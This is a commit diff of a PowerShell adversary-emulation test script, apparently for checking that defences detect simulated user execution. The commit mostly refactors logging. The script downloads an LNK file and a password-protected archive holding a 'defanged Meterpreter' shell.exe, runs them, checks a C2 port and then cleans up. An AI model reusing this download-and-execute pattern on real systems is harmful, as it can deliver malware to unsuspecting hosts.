f69282c4923f0719a63e424d7c44ed78a5102e25
hevnsnt <hevnsnt@gmail.com>
2024-03-08 19:35:50 -0600

    Refactored Logging to be more attractive and handle displaying log messages

--- RunTests.ps1
+++ RunTests.ps1
@@ -68,10 +68,8 @@ function Test-C2-Port {
         $tcpClient = New-Object System.Net.Sockets.TcpClient
         $tcpClient.Connect($IPAddress, $Port)
         $tcpClient.Close()
-        Write-Host "**WARNING** C2 IS CURRENTLY LISTENING." -ForegroundColor Red
-        Log-Message "C2: Operational"
+        Log-Message "C2 IS CURRENTLY LISTENING and Operational" ""
     } catch {
-        Write-Host "C2 Server is NOT LISTENING (PORT NOT ACCESSIBLE)`n" -ForegroundColor Green
         Log-Message "C2 Server is NOT LISTENING (PORT NOT ACCESSIBLE)"
     }
 }
@@ -93,17 +91,15 @@ function Test-SMTPAuthentication {
             $SMTPClient.EnableSsl = $true
             $SMTPClient.Credentials = $Credentials
             $SMTPClient.Timeout = 5000  # Set timeout to 5 seconds
-            Log-Message "Attempting SMTP Authentication"
+            Log-Message "Attempting Script Authentication"
             $SMTPClient.Send("ValidationScript@trifident.com", "to@example.com", "", "")
 
             # If no exception is thrown, authentication was successful
-            Write-Host "Authentication successful. Proceeding with the script..."
-            Log-Message "SMTP Authentication successful."
+            Log-Message "Authentication successful. Proceeding with the script..."
             return 
         } catch {
             # If an exception is thrown, authentication failed
-            Write-Host "Authentication failed. Please check your credentials and try again."
-            Log-Message "SMTP Authentication unsuccessful."
+            Log-Message "Authentication failed. Please check your credentials and try again."
             $ScriptPassword = Get-Script-Password
         }
     } while ($true)  # Continue prompting until successful authentication
@@ -128,7 +124,8 @@ function Get-Script-Password {
 
 function Log-Message {
     param(
-        [string]$Message
+        [string]$Message,
+        [string]$Error
     )
 
     # Get current timestamp in UTC
@@ -140,10 +137,19 @@ function Log-Message {
 
     # Format log message with both timestamps
     $LogMessage = "[$TimestampUtc | $TimestampEastern] $Message"
+    if ($Error) {
+        $LogMessage = "[!] $LogMessage Error: $Error"
+        Write-Host $LogMessage -ForegroundColor Red
+    } elseif ($Error -eq '') {
+        $LogMessage = "[+] $LogMessage"
+        Write-Host $LogMessage -ForegroundColor DarkGray
+    }
 
     # Append log message to log file
     Add-Content -Path "logfile.txt" -Value $LogMessage
 }
+
+
 
 # Function to run commands 
 function Run-AtomicTest1-Windows {
@@ -183,51 +189,55 @@ function Run-AtomicTest1-Windows {
     
     try {
         # Try downloading the file from the first URL
-        Log-Message "Run-AtomicTest1-Windows Downloading LNK file"
+        Log-Message "Run-AtomicTest1-Windows: Downloading LNK file"
         Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url -ErrorAction Stop
-        Write-Host "File downloaded successfully from $T1204002Url"
         Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url"
     }
     catch {
         # If an error occurs, display the error message
-        Write-Host "Error downloading file from $($T1204002Url): $_"
-        Write-Host "Trying second URL..."
-        Log-Message "Run-AtomicTest1-Windows: $T1204002Url Unsuccessful Download"
+        Log-Message "Run-AtomicTest1-Windows: Error downloading file from $($T1204002Url): $_" -Error $_.Exception.Message
+        Log-Message "Run-AtomicTest1-Windows:Trying second URL..."
         
         try {
             # Try downloading the file from the second URL
             Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url2 -ErrorAction Stop
-            Write-Host "File downloaded successfully from $T1204002Url2"
             Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url2"
         }
         catch {
             # If an error occurs again, display the error message and exit
-            Write-Host "Error downloading file from $($T1204002Url2): $_"
-            Write-Host "Failed to download the file from both URLs. Updating log information"
+            Log-Message "Run-AtomicTest1-Windows: Error downloading file from $($T1204002Url2): $_" -Error $_.Exception.Message
             Log-Message "Run-AtomicTest1-Windows: Unsuccessful Download from both URLs"
             return
         }
     }
 
     # The test file has been saved to $temp\test10.lnk
-    $file1 = "$tempDirectory\test10.lnk"
+    $lnkFile = Join-Path $tempDirectory "test10.lnk"
 
     # Execute the downloaded file
-    Log-Message "Run-AtomicTest1-Windows: Execute the downloaded file: $file1"
-    Start-Process $file1
+    try {
+        Log-Message "Run-AtomicTest1-Windows: Executing the downloaded file: $lnkFile"
+        Start-Process $lnkFile
+    } catch {
+        Log-Message "Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
+    }
+    
 
     # Wait for 10 seconds
     Start-Sleep -Seconds 10
 
     # Kill the process named "a.exe"
-    Log-Message "Run-AtomicTest1-Windows: Kill the process named a.exe"
-    taskkill /IM a.exe /F
+    try {
+        Log-Message "Run-AtomicTest1-Windows: Killing the a.exe (putty) process"
+        taskkill /IM a.exe /F
+    } catch {
+        Log-Message "Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
+    }
 
     # Removing all downloaded or created files
     Log-Message "Run-AtomicTest1-Windows: Removing all downloaded or created files"
-    $file1 = "$tempDirectory\test10.lnk"
-    $file2 = "$tempDirectory\a.exe"
-    Remove-Item $file1 -ErrorAction Ignore
+    $file2 = Join-Path $tempDirectory "a.exe"
+    Remove-Item $lnkFile -ErrorAction Ignore
     Remove-Item $file2 -ErrorAction Ignore
 }
 
@@ -258,7 +268,7 @@ function Run-AtomicTest2-Windows {
     # Log the C2 server validation
     Write-Host "    Validating the C2 server is " -NoNewline
     Write-Host "non-operational" -ForegroundColor Green -NoNewline
-    Write-Host " prior to execution: " -NoNewline
+    Write-Host " prior to execution: "
     Test-C2-Port
     
     # First URL to download
@@ -267,7 +277,7 @@ function Run-AtomicTest2-Windows {
     # Second URL to download (provide your own URL)
     $T12040022Url2 = "YOUR_SECOND_URL_HERE"
     # Log the user confirmation
-    $confirmation = Read-Host "Do you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
+    $confirmation = Read-Host "`nDo you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
     Log-Message "User confirmation: $confirmation"
     if ($confirmation -ne "Y") {
         Write-Host "Exiting script..."
@@ -282,7 +292,7 @@ function Run-AtomicTest2-Windows {
     }
     catch {
         # If the first attempt fails, try the second URL
-        Log-Message "Error downloading file from $T12040022Url"
+        Log-Message "Error downloading file from $T12040022Url" -Error $_.Exception.Message
         Log-Message "Trying second URL"
         try {
             Log-Message "Downloading shell-trifident.zip from second URL"
@@ -291,44 +301,53 @@ function Run-AtomicTest2-Windows {
         }
         catch {
             # If both attempts fail, log the error and exit
-            Log-Message "Error downloading file from $T12040022Url2"
+            Log-Message "Error downloading file from $T12040022Url2" -Error $_.Exception.Message
             Log-Message "Failed to download the file from both URLs"
             return
         }
     }
-
+    $zipFile = Join-Path $tempDirectory "shell-trifident.zip"
     # Unzip the downloaded file
     if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-        Log-Message "7Zip4Powershell module Not installed, installing"
+        Log-Message "7Zip4Powershell module Not installed, installing" ""
         Install-Module -Name 7Zip4Powershell -Force
         Log-Message "7Zip4Powershell module installed"
     } else {
         Log-Message "7Zip4Powershell module is already installed."
     }
-
-    if ((Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-        Log-Message "Unzipping shell-trifident.zip"
-        Expand-7Zip -ArchiveFileName "$tempDirectory\shell-trifident.zip" -Password "trifident" -TargetPath $tempDirectory
-        Log-Message "shell-trifident.zip unpacked to $tempDirectory"
-    } else {
-        Log-Message "Unable to unzip the file because the 7Zip4Powershell module is not available."
-        return
+    try {
+        if ((Get-Module -Name 7Zip4Powershell -ListAvailable)) {
+            Log-Message "Unzipping shell-trifident.zip"
+            $ErrorActionPreference = "Stop"  # Set $ErrorActionPreference to "Stop"
+            Expand-7Zip -ArchiveFileName $zipFile -Password "trifident" -TargetPath $tempDirectory
+            $ErrorActionPreference = "Continue"  # Reset $ErrorActionPreference
+            Log-Message "shell-trifident.zip unpacked to $tempDirectory"
+        } else {
+            Log-Message "Unable to unzip the file because the 7Zip4Powershell module is not available."
+            return
+        }
+    } catch {
+        #This errors if script is running on a non-Windows OS.  This should never happen.
+        Log-Message "Error unpacking shell-trifident.zip to $tempDirectory" -Error $_.Exception.Message
     }
     
+
+    
+    $executeFile = Join-Path $tempDirectory "shell.exe"
     # Execute the downloaded file
-    Log-Message "Executing $tempDirectory\shell.exe"
-    Start-Process "$tempDirectory\shell.exe"
+    Log-Message "Executing $executeFile"
+    Start-Process $executeFile
 
     # Wait for 10 seconds
     Start-Sleep -Seconds 10
 
     # Terminate the process
     taskkill /IM shell.exe /F
-    Log-Message "Terminated $tempDirectory\shell.exe process"
+    Log-Message "Terminated $executeFile process"
 
     # Clean up - remove downloaded files
     Log-Message "Removing all downloaded or created files"
-    $filesToRemove = "$tempDirectory\shell-trifident.zip", "$tempDirectory\shell.exe"
+    $filesToRemove = $zipFile, $executeFile
     foreach ($file in $filesToRemove) {
         Remove-Item $file -ErrorAction Ignore
         Log-Message "Removed $file"
